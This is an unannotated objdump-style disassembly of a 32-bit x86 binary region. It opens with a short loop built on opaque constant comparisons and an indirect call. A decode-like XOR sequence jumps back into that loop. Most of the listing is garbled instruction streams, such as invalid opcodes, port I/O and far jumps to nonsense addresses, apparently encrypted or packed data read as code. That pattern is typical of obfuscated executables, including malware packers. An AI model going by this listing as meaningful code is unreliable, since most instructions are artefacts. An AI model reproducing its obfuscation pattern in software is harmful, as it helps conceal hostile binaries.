  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	dec    DWORD PTR [eax]
  417e8e:	adc    DWORD PTR [esi+0x7f371e44],ecx
  417e94:	js     0x417f11
  417e96:	jle    0x417f10
  417e98:	js     0x417ea0
  417e9a:	in     eax,0x67
  417e9c:	push   edx
  417e9d:	lock retf 
  417e9f:	pop    esp
  417ea0:	cmp    al,0xed
  417ea2:	(bad)  
  417ea3:	xor    al,0x27
  417ea5:	dec    esi
  417ea6:	in     eax,0x27
  417ea8:	push   0xdc050a1c
  417ead:	repnz stc 
  417eaf:	cwde   
  417eb0:	pop    ss
  417eb1:	mov    esp,0x2fc2015b
  417eb6:	jl     0x417ea0
  417eb8:	jg     0x417e3a
  417eba:	lods   al,BYTE PTR ds:[esi]
  417ebb:	mov    ch,0x11
  417ebd:	(bad)
  417ec0:	movups xmm0,XMMWORD PTR [ecx]
  417ec3:	aad    0x1
  417ec5:	sub    DWORD PTR [ecx],ecx
  417ec7:	xchg   ebx,eax
  417ec8:	add    al,0x74
  417eca:	push   esi
  417ecb:	ds push es
  417ecd:	cdq    
  417ece:	in     al,dx
  417ecf:	pop    es
  417ed0:	sub    DWORD PTR [ebx-0x335a640f],esp
  417ed6:	fcomp  QWORD PTR [esi+0x41]
  417ed9:	lods   eax,DWORD PTR ds:[esi]
  417eda:	cmc    
  417edb:	clc    
  417edc:	xchg   ecx,eax
  417edd:	push   0xc1993ad6
  417ee2:	push   cs
  417ee3:	rol    ch,1
  417ee5:	repz in al,0x86
  417ee8:	xchg   ecx,eax
  417ee9:	ins    DWORD PTR es:[edi],dx
  417eea:	out    0xbb,al
  417eec:	mov    eax,0x3ea548d5
  417ef1:	xchg   esi,eax
  417ef2:	daa    
  417ef3:	mov    WORD PTR [edi],es
  417ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef6:	dec    edi
  417ef7:	pop    eax
  417ef8:	leave  
  417ef9:	and    cl,ch
  417efb:	jmp    0x3e3f:0xec44be13
  417f02:	and    al,0x7a
  417f04:	dec    esi
  417f05:	mov    ecx,0xc1f3168d
  417f0a:	dec    ebp
  417f0b:	outs   dx,DWORD PTR ds:[esi]
  417f0c:	ins    DWORD PTR es:[edi],dx
  417f0d:	mov    eax,0xfdf78e72
  417f12:	mov    edi,0xfd90a64b
  417f17:	test   DWORD PTR [ebp+0x2d5e94f1],0x13e07cc3
  417f21:	loope  0x417ee3
  417f23:	lock add BYTE PTR [eax-0x5c],bl
  417f27:	test   BYTE PTR [ebx+0x59],ah
  417f2a:	bound  ebp,QWORD PTR [ebp-0x3bcc1196]
  417f30:	mov    esi,0xf633b7c
  417f35:	test   BYTE PTR [ebx-0x64],bl
  417f38:	out    0xc9,al
  417f3a:	push   edi
  417f3b:	xor    ecx,DWORD PTR [eax]
  417f3d:	fs std 
  417f3f:	add    ebp,DWORD PTR [ecx-0x60]
  417f42:	popa   
  417f43:	stc    
  417f44:	jnp    0x417edb
  417f46:	mov    WORD PTR [edi-0x4edccce7],?
  417f4c:	aad    0x82
  417f4e:	xor    eax,DWORD PTR [ebx-0x3b84ab19]
  417f54:	cmp    al,0x19
  417f56:	fist   DWORD PTR [ebx-0x657a5a7]
  417f5c:	adc    dh,cl
  417f5e:	add    edi,DWORD PTR [ecx+0x2161558]
  417f64:	mov    ds:0xf35a2ede,al
  417f69:	in     al,0x3e
  417f6b:	mov    BYTE PTR [edx-0x13564498],dh
  417f71:	leave  
  417f72:	dec    edi
  417f73:	push   ecx
  417f74:	add    al,0xb5
  417f76:	sub    BYTE PTR [ebx+ebp*8],0xde
  417f7a:	push   eax
  417f7b:	out    dx,eax
  417f7c:	rcl    ch,1
  417f7e:	or     ebp,ebp
  417f80:	or     eax,DWORD PTR [esi-0x454fc52d]
  417f86:	inc    esp
  417f87:	or     ah,BYTE PTR [edi-0xa]
  417f8a:	sub    cl,BYTE PTR [esi+0x1e]
  417f8d:	xchg   DWORD PTR [eax],ebp
  417f8f:	cmp    DWORD PTR [edi+0x39],edi
  417f92:	push   0x67801d9a
  417f97:	push   edi
  417f98:	cmp    eax,DWORD PTR [esi-0x5b]
  417f9b:	adc    esp,ebx
  417f9d:	rol    eax,1
  417f9f:	xor    DWORD PTR [ebp+edx*4-0x7ddc3bb9],esi
  417fa6:	in     al,0x5b
  417fa8:	sub    al,0x7e
  417faa:	gs enter 0xa2e0,0x6f
  417faf:	or     al,0xdc
  417fb1:	mov    bh,ah
  417fb3:	mov    edi,0x8f434726
  417fb8:	dec    esp
  417fb9:	call   0xc062dbbe
  417fbe:	punpckhdq mm4,QWORD PTR gs:0x9938ee3e
  417fc6:	xchg   BYTE PTR [ebx+0x63b392f4],al
  417fcc:	ins    BYTE PTR es:[edi],dx
  417fcd:	lahf   
  417fce:	adc    al,0x11
  417fd0:	or     dl,BYTE PTR [edx]
  417fd2:	add    eax,0xda042e06
  417fd7:	sbb    ch,BYTE PTR [edi+eiz*1]
  417fda:	mov    bl,BYTE PTR [eax-0x2f23595d]
  417fe0:	mov    dl,0x61
  417fe2:	in     al,dx
  417fe3:	cmp    BYTE PTR [eax],ch
  417fe5:	xchg   ebp,eax
  417fe6:	jmp    0x417fb1
  417fe8:	jo     0x418000
  417fea:	inc    ecx
  417feb:	les    ecx,FWORD PTR [ebx]
  417fed:	pop    ds
  417fee:	ret    0xdf31
  417ff1:	inc    ebp
  417ff2:	int    0xf6
  417ff4:	scas   al,BYTE PTR es:[edi]
  417ff5:	retf   0xf009
  417ff8:	jmp    0x86552eb9
  417ffd:	dec    esi
  417ffe:	aam    0xf8
  418000:	push   eax
  418001:	or     eax,0xa24dee51
  418006:	ret    0x4122
  418009:	js     0x417fca
  41800b:	inc    edi
  41800c:	nop
  41800d:	int3   
  41800e:	sub    eax,0x79bd18dd
  418013:	mov    ebp,0xb6453ac5
  418018:	inc    edx
  418019:	adc    BYTE PTR [edi-0x710d164b],al
  41801f:	in     al,0x57
  418021:	mov    bl,0x92
  418023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418024:	push   ds
  418025:	cld    
  418026:	jp     0x418035
  418028:	mov    al,0x65
  41802a:	add    DWORD PTR [ebx],esp
  41802c:	cld    
  41802d:	retf   
  41802e:	xchg   esi,eax
  41802f:	ins    BYTE PTR es:[edi],dx
  418030:	or     BYTE PTR [edi],bl
  418032:	bound  eax,QWORD PTR [ebx]
  418034:	stos   BYTE PTR es:[edi],al
  418035:	bound  eax,QWORD PTR [ecx-0x21]
  418038:	mov    ebx,0x43a91779
  41803d:	nop
  41803e:	jmp    0x41803a
  418040:	mov    eax,ds:0x92339812
  418045:	mov    dh,0x7c
  418047:	mov    cl,0xfc
  418049:	call   0x6a7a092e
  41804e:	inc    edi
  41804f:	push   es
  418050:	or     dh,BYTE PTR [ecx-0x51307c22]
  418056:	push   edx
  418057:	mov    edx,0xeae5237c
  41805c:	inc    ebx
  41805d:	sub    DWORD PTR [esi],0xffffff80
  418060:	jmp    0xb2d1:0xf2e12a8
  418067:	push   esp
  418068:	lahf   
  418069:	sub    eax,0x32bd6cb1
  41806e:	add    DWORD PTR ds:0xd4ad9d8f,ebx
  418074:	data16 (bad) 
  418076:	jmp    0xb4d45a83
  41807b:	jno    0x418044
  41807d:	aam    0x5f
  41807f:	sub    eax,DWORD PTR [ecx+0x30637a06]
  418085:	push   eax
  418086:	add    DWORD PTR [ecx],esi
  418088:	xor    DWORD PTR [ebx-0xc10cc4a],ecx
  41808e:	in     eax,dx
  41808f:	mov    ebp,0xf7d00de9
  418094:	sbb    eax,0x6a048ea
  418099:	dec    eax
  41809a:	adc    esp,DWORD PTR [esi-0x3bbfbc1f]
  4180a0:	arpl   cx,bx
  4180a2:	jmp    0x4180e7
  4180a4:	arpl   WORD PTR ds:0x46bc7a3d,cx
  4180aa:	sbb    ebx,DWORD PTR [ecx+0x31]
  4180ad:	sub    al,0x1c
  4180af:	or     DWORD PTR [ebx+0x4c6b65af],esp
  4180b5:	add    al,0x23
  4180b7:	mov    esi,0xc1459184
  4180bc:	into   
  4180bd:	(bad)  
  4180be:	jno    0x41811a
  4180c0:	mov    edx,0x9e28b61
  4180c5:	ret    
  4180c6:	fsubr  DWORD PTR [ebx+0x3b]
  4180c9:	mov    bl,BYTE PTR [eax-0x22406827]
  4180cf:	sbb    BYTE PTR [edx+edx*2+0x45],dl
  4180d3:	sub    ebp,0xd371ed65
  4180d9:	or     eax,0x144f5341
  4180de:	dec    edi
  4180df:	inc    ecx
  4180e0:	int3   
  4180e1:	or     al,0x93
  4180e3:	sbb    DWORD PTR [esi],ebx
  4180e5:	scas   eax,DWORD PTR es:[edi]
  4180e6:	xor    edi,ecx
  4180e8:	fnstcw WORD PTR [edi]
  4180ea:	lahf   
  4180eb:	push   esi
  4180ec:	cmp    al,0x25
  4180ee:	pop    edx
  4180ef:	xor    edx,edx
  4180f1:	fdiv   DWORD PTR [ebx+0x50]
  4180f4:	(bad)  
  4180f5:	and    dl,dh
  4180f7:	push   es
  4180f8:	mov    dh,0x16
  4180fa:	push   cs
  4180fb:	pusha  
  4180fc:	(bad)  
  4180fd:	fcom   DWORD PTR [edi-0x63]
  418100:	lahf   
  418101:	ror    BYTE PTR [edi+0x35],1
  418104:	fcom   QWORD PTR [esi]
  418106:	pop    ecx
  418107:	packssdw mm1,QWORD PTR [edi+0x26e8fa48]
  41810e:	fdivr  st,st(0)
  418110:	aad    0xe
  418112:	lahf   
  418113:	sbb    al,BYTE PTR [edi-0x4a]
  418116:	sbb    ch,bl
  418118:	xchg   edi,eax
  418119:	sub    BYTE PTR [edx],0xe4
  41811c:	xchg   esi,eax
  41811d:	fldcw  WORD PTR [esi-0x2c628960]
  418123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418124:	fwait
  418125:	mov    ebx,0x314741d
  41812a:	out    dx,al
  41812b:	hlt    
  41812c:	mov    ds:0x4cb5c954,eax
  418131:	jne    0x4180d0
  418133:	(bad)  
  418134:	aaa    
  418135:	xchg   dl,bh
  418137:	xchg   esp,eax
  418138:	sbb    eax,0x8081b663
  41813d:	das    
  41813e:	mov    ecx,0xfdc096d3
  418143:	fdivr  QWORD PTR [edx+0x6b]
  418146:	std    
  418147:	fistp  QWORD PTR [ebp+0x5690c9e6]
  41814d:	adc    bh,bl
  41814f:	add    eax,0x8c75696d
  418154:	mov    eax,0x9e3541c2
  418159:	cmc    
  41815a:	(bad)  
  41815b:	stos   DWORD PTR es:[edi],eax
  41815c:	mov    ebx,0x6bacb01e
  418161:	neg    DWORD PTR [edi]
  418163:	mov    ah,0x28
  418165:	mov    edi,0x8bb0c0b0
  41816a:	adc    DWORD PTR [ebp+0x6298da20],ebp
  418170:	xor    eax,0xc8a38757
  418175:	xchg   esp,eax
  418176:	jns    0x41813c
  418178:	out    dx,al
  418179:	dec    edx
  41817a:	add    al,dh
  41817c:	inc    edx
  41817d:	add    al,0xbc
  41817f:	xchg   edx,eax
  418180:	inc    esp
  418181:	out    dx,al
  418182:	ret    0xba33
  418185:	cli    
  418186:	cmp    eax,DWORD PTR [edi-0x12]
  418189:	cld    
  41818a:	fist   DWORD PTR [edx]
  41818c:	rcr    dh,1
  41818e:	or     al,0x38
  418190:	ins    DWORD PTR es:[edi],dx
  418191:	dec    esi
  418192:	rcr    DWORD PTR ds:0x758b2998,0xc
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	popf   
  4181b8:	(bad)  
  4181b9:	mov    cl,0x7
  4181bb:	sbb    DWORD PTR [edi+edi*2],esi
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x4181c6
  4181c4:	push   edi
  4181c5:	push   edx
  4181c6:	push   ds
  4181c7:	push   es
  4181c8:	lock daa 
  4181ca:	retf   0xf5e
  4181cd:	xchg   BYTE PTR [edi],cl
  4181cf:	outs   dx,BYTE PTR ds:[esi]
  4181d0:	or     dh,BYTE PTR [ebp-0x9]
  4181d3:	dec    ecx
  4181d4:	aad    0xba
  4181d6:	mov    cl,0x79
  4181d8:	aaa    
  4181d9:	push   edi
  4181da:	sbb    edx,edx
  4181dc:	push   ebx
  4181dd:	and    ax,WORD PTR [esi+0xc6013cd]
  4181e4:	mov    cl,0x1b
  4181e6:	xchg   edi,eax
  4181e7:	mov    al,ds:0x3bd41ad6
  4181ec:	dec    ebp
  4181ed:	or     BYTE PTR [eax],dl
  4181ef:	arpl   WORD PTR [edx+0x16],cx
  4181f2:	mov    fs,WORD PTR [esi]
  4181f4:	and    DWORD PTR [edx+0x40d07714],esp
  4181fa:	mov    al,0x69
  4181fc:	jb     0x41818c
  4181fe:	imul   DWORD PTR [edx+0x2659d747]
  418204:	and    al,0x73
  418206:	cmp    al,0xaa
  418208:	inc    edi
  418209:	sub    al,0x36
  41820b:	jmp    0xd38c:0x77693f12
  418212:	adc    eax,0xf2508aaa
  418217:	stc    
  418218:	das    
  418219:	enter  0xd44a,0xda
  41821d:	xchg   ebx,eax
  41821e:	dec    esp
  41821f:	je     0x4181c1
  418221:	push   0xd85ae322
  418226:	cs int 0x2b
  418229:	test   eax,0xdef2c3b9
  41822e:	ja     0x4181ca
  418230:	ja     0x4181c3
  418232:	adc    BYTE PTR [ebx-0x52bc3478],ah
  418238:	jo     0x418265
  41823a:	dec    edx
  41823b:	jl     0x418291
  41823d:	loopne 0x418247
  41823f:	mov    esp,DWORD PTR [esi-0x5a]
  418242:	cld    
  418243:	mov    edx,0x677aa370
  418248:	cmp    DWORD PTR [esi],ebp
  41824a:	push   esi
  41824b:	div    BYTE PTR [ebp+ecx*4-0x58be513d]
  418252:	gs das 
  418254:	ds xor ah,dh
  418257:	imul   ebx,DWORD PTR [edi-0x164ea9da],0x5b
  41825e:	mov    ecx,0xcc6cfee9
  418263:	(bad)  
  418264:	ds pusha 
  418266:	cmp    dl,BYTE PTR [ecx-0x6d]
  418269:	adc    ebp,edx
  41826b:	(bad)  
  41826c:	pop    edx
  41826d:	inc    ecx
  41826e:	cs mov esp,0x58853b48
  418274:	add    eax,esi
  418276:	inc    edx
  418277:	jnp    0x418288
  418279:	stc    
  41827a:	or     BYTE PTR [ecx],bh
  41827c:	inc    ebp
  41827d:	retf   
  41827e:	pop    esp
  41827f:	fimul  WORD PTR [edi]
  418281:	pop    ecx
  418282:	mov    edi,0x39810105
  418287:	xor    DWORD PTR [ebp-0x13b58264],ecx
  41828d:	push   0xe6da73c
  418292:	and    eax,0xfb5309d8
  418297:	mov    ds:0xb5408b70,eax
  41829c:	mov    ebx,0xbfb63e39
  4182a1:	sbb    esp,DWORD PTR [ecx+esi*8]
  4182a4:	jbe    0x41827f
  4182a6:	fs stos BYTE PTR es:[edi],al
  4182a8:	push   ss
  4182a9:	jmp    0x4182bb
  4182ab:	ret    
  4182ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ad:	push   ecx
  4182ae:	dec    edx
  4182af:	hlt    
  4182b0:	lds    esi,FWORD PTR [eax-0x6c1fa472]
  4182b6:	sbb    BYTE PTR [ebx-0x11],ah
  4182b9:	hlt    
  4182ba:	sti    
  4182bb:	fcom   QWORD PTR [esi+edi*1-0x5f]
  4182bf:	rcr    DWORD PTR [esi],cl
  4182c1:	stos   BYTE PTR es:[edi],al
  4182c2:	push   es
  4182c3:	leave  
  4182c4:	fidiv  WORD PTR [edx+0x27]
  4182c7:	sti    
  4182c8:	xchg   esp,eax
  4182c9:	push   es
  4182ca:	test   al,0x18
  4182cc:	ret    0x42c4
  4182cf:	fs pop ebp
  4182d1:	fadd   st,st(5)
  4182d3:	test   al,0xe5
  4182d5:	xchg   DWORD PTR [ebp+0x32],esi
  4182d8:	xor    BYTE PTR [edx],al
  4182da:	adc    al,0x3a
  4182dc:	repz scas al,BYTE PTR es:[edi]
  4182de:	dec    dl
  4182e0:	imul   eax,edx,0xfffffffd
  4182e3:	adc    al,0x5d
  4182e5:	lods   eax,DWORD PTR ds:[esi]
  4182e6:	mov    WORD PTR [ecx-0x3],ss
  4182e9:	mov    esp,0x48df439f
  4182ee:	xlat   BYTE PTR ds:[ebx]
  4182ef:	jecxz  0x4182a1
  4182f1:	pop    ds
  4182f2:	fisubr DWORD PTR [eax+ebp*8+0x1ebee348]
  4182f9:	push   0xe12897f7
  4182fe:	inc    esi
  4182ff:	inc    edx
  418300:	sub    eax,0x2abb4896
  418305:	loopne 0x4182c4
  418307:	fbstp  TBYTE PTR [esi+ecx*8-0x7f113d3a]
  41830e:	retf   0x50b9
  418311:	xchg   esp,eax
  418312:	(bad)  
  418313:	(bad)  
  418314:	jmp    0x97bc:0x99371cb2
  41831b:	outs   dx,BYTE PTR ds:[esi]
  41831c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41831d:	cmp    esp,eax
  41831f:	sbb    esp,edx
  418321:	std    
  418322:	out    0x24,eax
  418324:	icebp  
  418325:	xchg   ecx,eax
  418326:	jmp    0x4182be
  418328:	int    0x1d
  41832a:	fcmovnbe st,st(6)
  41832c:	jp     0x4182ef
  41832e:	adc    ebx,edi
  418330:	add    DWORD PTR ds:0x55c15860,esi
  418336:	adc    DWORD PTR [edx+0x10],ebp
  418339:	dec    DWORD PTR [ecx+0x56ae58b3]
  41833f:	int3   
  418340:	fistp  WORD PTR [esi-0x41126961]
  418346:	adc    DWORD PTR [ebx],ecx
  418348:	adc    esi,DWORD PTR [eax+0x71]
  41834b:	lods   al,BYTE PTR ds:[esi]
  41834c:	outs   dx,BYTE PTR ds:[esi]
  41834d:	jno    0x418309
  41834f:	outs   dx,DWORD PTR ds:[esi]
  418350:	mov    BYTE PTR [edi+0xa14654e],cl
  418356:	sub    DWORD PTR [eax],edi
  418358:	cmc    
  418359:	or     dh,dl
  41835b:	sub    eax,0x35ee9a87
  418360:	push   ds
  418361:	test   BYTE PTR [esi],dh
  418363:	div    DWORD PTR [ebx-0x5c]
  418366:	int    0xf6
  418368:	mov    ah,0x49
  41836a:	cld    
  41836b:	or     ch,BYTE PTR [edx]
  41836d:	std    
  41836e:	pop    eax
  41836f:	sbb    cl,BYTE PTR [ecx-0x24]
  418372:	shl    BYTE PTR [esi-0x21],1
  418375:	or     esi,ebp
  418377:	push   ebp
  418378:	and    al,0x7
  41837a:	xchg   BYTE PTR [ebp-0x49b512a],al
  418380:	call   0xca3c:0xdd8a8628
  418387:	call   0x8017:0x54d1736b
  41838e:	aaa    
  41838f:	adc    edx,ebx
  418391:	cmp    BYTE PTR es:[ecx],al
  418394:	lea    edi,[edi-0x30]
  418397:	mov    ecx,0x7dbf074e
  41839c:	jnp    0x41839c
  41839e:	cmp    BYTE PTR [eiz*1+0x3cd20e1a],dh
  4183a5:	jl     0x41839f
  4183a7:	stos   BYTE PTR es:[edi],al
  4183a8:	sbb    bh,BYTE PTR [ebp+0x3]
  4183ab:	mov    BYTE PTR [edx-0x60],0x8e
  4183af:	pop    ds
  4183b0:	and    bl,bh
  4183b2:	xchg   BYTE PTR [ebx+0x5459569],bh
  4183b8:	push   esi
  4183b9:	ja     0x4183d9
  4183bb:	adc    BYTE PTR [edi-0x4b5e2eae],cl
  4183c1:	jae    0x41835c
  4183c3:	mov    bl,0x5b
  4183c5:	xlat   BYTE PTR ds:[ebx]
  4183c6:	pop    edi
  4183c7:	jno    0x41836e
  4183c9:	pop    ecx
  4183ca:	dec    esp
  4183cb:	je     0x418395
  4183cd:	and    BYTE PTR [eax+0x41],al
  4183d0:	jmp    0x5a57356e
  4183d5:	(bad)  [ecx+0x78a88909]
  4183db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183dc:	sub    ah,al
  4183de:	jmp    0xf2b:0xaf1fead
  4183e5:	ins    DWORD PTR es:[edi],dx
  4183e6:	loopne 0x41837b
  4183e8:	outs   dx,BYTE PTR ds:[esi]
  4183e9:	fs cmp al,0xbc
  4183ec:	add    BYTE PTR ds:0x57d50418,dl
  4183f2:	cmp    cl,BYTE PTR [ebx+0x45145677]
  4183f8:	out    0x30,al
  4183fa:	outs   dx,BYTE PTR ds:[esi]
  4183fb:	inc    ebp
  4183fc:	dec    ebx
  4183fd:	mov    ecx,0xd8d7efa4
  418402:	out    0xee,al
  418404:	fdivr  st,st(0)
  418406:	push   es
  418407:	jae    0x418397
  418409:	xchg   DWORD PTR [esi],eax
  41840b:	clc    
  41840c:	repnz in eax,0xd2
  41840f:	inc    eax
  418410:	jg     0x418414
  418412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418413:	sub    DWORD PTR [ebp+0x20930b2],edi
  418419:	dec    ebp
  41841a:	xor    eax,0xd914245d
  41841f:	aam    0x96
  418421:	fist   WORD PTR [edx+0x20556c40]
  418427:	jns    0xb97d19a3
  41842d:	(bad)  ds:0x462d53fd
  418433:	rol    esp,0x26
  418436:	mov    bl,0x57
  418438:	mov    eax,0xc39cf40e
  41843d:	aad    0x20
  41843f:	mov    edi,DWORD PTR [eax-0x62]
  418442:	and    BYTE PTR [eax-0x14],ah
  418445:	fwait
  418446:	imul   eax,DWORD PTR [ebx+edi*1-0x15],0xd28eb34c
  41844e:	adc    DWORD PTR [ecx],ecx
  418450:	aam    0x2
  418452:	popa   
  418453:	int3   
  418454:	xor    eax,0x551c9c0a
  418459:	lods   al,BYTE PTR ds:[esi]
  41845a:	fbld   TBYTE PTR [eax]
  41845c:	mov    ecx,0x25184939
  418461:	xor    eax,0x69e455f8
  418466:	or     dh,ah
  418468:	jmp    0x41849e
  41846a:	and    BYTE PTR [edi+0x64],ch
  41846d:	mov    WORD PTR [ebp+0x6299aa00],?
  418473:	jecxz  0x4184ad
  418475:	fxch   st(7)
  418477:	xor    eax,0x56d878c1
  41847c:	shl    DWORD PTR [edx-0x3d],cl
  41847f:	push   esi
  418480:	adc    ch,BYTE PTR [ebp+0x60]
  418483:	jmp    0xdf2d:0x1b7a7e05
  41848a:	in     eax,dx
  41848b:	mov    eax,0x49461aa5
  418490:	call   FWORD PTR [ecx+0x6b]
  418493:	and    al,0x47
  418495:	push   ds
  418496:	mov    WORD PTR [esi-0x33178492],gs
  41849c:	div    DWORD PTR [ecx-0x66e1dfb9]
  4184a2:	into   
  4184a3:	retf   
  4184a4:	mov    edi,0x69988d32
  4184a9:	xchg   al,bl
  4184ab:	daa    
  4184ac:	inc    esp
  4184ad:	inc    esp
  4184ae:	retf   
  4184af:	fcom   DWORD PTR [edi+0xb]
  4184b2:	xchg   DWORD PTR [eiz*1+0x1120fc40],esp
  4184b9:	in     al,dx
  4184ba:	mov    edx,0x68e7d11d
  4184bf:	icebp  
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xe2ec6d48
  4184e3:	xor    bl,BYTE PTR ds:0x7f39148a
  4184e9:	js     0x418566
  4184eb:	jle    0x418565
  4184ed:	js     0x418488
  4184ef:	jno    0x418567
  4184f1:	ret    
  4184f2:	stos   BYTE PTR es:[edi],al
  4184f3:	lds    ecx,FWORD PTR [ebx]
  4184f5:	jmp    0x418525
  4184f7:	or     BYTE PTR [eax-0x1c84da92],0x8d
  4184fe:	retf   
  4184ff:	pop    edi
  418500:	inc    ebx
  418501:	sub    eax,0x51e5fe83
  418506:	fnstcw WORD PTR [eax-0x5e]
  418509:	imul   esp,DWORD PTR [edx],0xaa2dfea5
  41850f:	std    
  418510:	adc    eax,0xac46553e
  418515:	icebp  
  418516:	inc    edi
  418517:	add    eax,0xc428b9cb
  41851c:	mov    esi,0x1dd950fb
  418521:	and    DWORD PTR [esi],edx
  418523:	int    0x6d
  418525:	or     eax,0x29641d67
  41852a:	adc    cl,al
  41852c:	sbb    BYTE PTR [ebx],ah
  41852e:	dec    esi
  41852f:	and    dl,BYTE PTR [eax]
  418531:	xchg   BYTE PTR [ecx-0x7d],ah
  418534:	inc    eax
  418535:	xor    BYTE PTR ds:0xebb33473,dh
  41853b:	sar    BYTE PTR [ecx-0x6b9e463f],0x61
  418542:	stos   BYTE PTR es:[edi],al
  418543:	cmp    ah,BYTE PTR [esi-0x7da5108f]
  418549:	dec    ebx
  41854a:	gs jl  0x41853c
  41854d:	not    BYTE PTR [eax]
  41854f:	push   eax
  418550:	mov    ds:0xdd014f67,eax
  418555:	push   0xcf421676
  41855a:	sbb    dl,BYTE PTR [ebx]
  41855c:	adc    al,0x83
  41855e:	loope  0x418559
  418560:	stos   DWORD PTR es:[edi],eax
  418561:	and    ch,0xb
  418564:	mov    fs,WORD PTR [esi+0x44]
  418567:	and    dh,BYTE PTR [edx-0x15]
  41856a:	clc    
  41856b:	pop    eax
  41856c:	cli    
  41856d:	fisubr DWORD PTR [esp+ecx*1-0x16985891]
  418574:	mov    ch,0x11
  418576:	test   al,0x81
  418578:	add    dl,BYTE PTR [eiz*4-0x505d168a]
  41857f:	inc    ebx
  418580:	(bad)  
  418581:	jnp    0x418526
  418583:	sub    al,0x1e
  418585:	cmc    
  418586:	jae    0x41851d
  418588:	(bad)  
  418589:	not    DWORD PTR [edx]
  41858b:	cmp    eax,0xd217c152
  418590:	inc    edi
  418591:	inc    esi
  418592:	cmp    cl,BYTE PTR [esi+edi*4]
  418595:	or     BYTE PTR [edi+0x1],dh
  418598:	sbb    ah,BYTE PTR [esi]
  41859a:	xor    esp,DWORD PTR [eax+eax*8-0x2ff01b79]
  4185a1:	xor    DWORD PTR [edx+0x148297eb],esp
  4185a7:	mov    al,ds:0xa5709db9
  4185ac:	push   ebp
  4185ad:	sbb    BYTE PTR [edx-0x4a],dl
  4185b0:	or     al,0x7c
  4185b2:	or     eax,DWORD PTR [ecx+0x7]
  4185b5:	loope  0x418547
  4185b7:	mov    ds:0xbdae5cea,eax
  4185bc:	or     esp,ebx
  4185be:	add    al,BYTE PTR [esi+0x6e]
  4185c1:	jle    0x41860a
  4185c3:	sar    BYTE PTR [edx+0x58],cl
  4185c6:	or     DWORD PTR [eax],ebp
  4185c8:	pop    edi
  4185c9:	jle    0x418620
  4185cb:	add    ecx,ebp
  4185cd:	and    eax,0xc43d7841
  4185d2:	outs   dx,BYTE PTR ds:[esi]
  4185d3:	aad    0xd
  4185d5:	and    edi,ebx
  4185d7:	mov    esp,0x5dd0b0f9
  4185dc:	jle    0x4185ae
  4185de:	cdq    
  4185df:	jno    0x4185a5
  4185e1:	lds    eax,FWORD PTR [edi+0x578ebd38]
  4185e7:	daa    
  4185e8:	push   esp
  4185e9:	les    esi,FWORD PTR [esi]
  4185eb:	and    al,0x6d
  4185ed:	sbb    ebx,DWORD PTR [edi+0x6603af88]
  4185f3:	rcl    BYTE PTR gs:[ebx-0x1d],cl
  4185f7:	dec    ebx
  4185f8:	mov    eax,ds:0x275949f0
  4185fd:	pop    ds
  4185fe:	pop    esi
  4185ff:	sahf   
  418600:	jecxz  0x4185a4
  418602:	rol    BYTE PTR [esi+esi*4+0x2e],cl
  418606:	xchg   edx,eax
  418607:	scas   al,BYTE PTR es:[edi]
  418608:	stc    
  418609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41860a:	xchg   DWORD PTR [ecx+0x6f],ebp
  41860d:	push   esp
  41860e:	mov    WORD PTR [esp+eiz*8+0x7bc24ed8],?
  418615:	push   esp
  418616:	fisttp DWORD PTR [edx]
  418618:	daa    
  418619:	fadd   DWORD PTR [ebx]
  41861b:	in     eax,0x1c
  41861d:	cmp    DWORD PTR ss:[eax-0x75],ebp
  418621:	cmp    DWORD PTR [edi+0x35bf29b7],esi
  418627:	popa   
  418628:	dec    edi
  418629:	mov    esp,0xfc07bbbd
  41862e:	out    0xc4,al
  418630:	sub    BYTE PTR [eax+0x5d],dl
  418633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418634:	aas    
  418635:	add    edx,ecx
  418637:	fdivr  DWORD PTR [esi-0x75eb78af]
  41863d:	jg     0x41860b
  41863f:	(bad)  
  418640:	and    BYTE PTR [eax-0x7f08a090],ch
  418646:	stos   BYTE PTR es:[edi],al
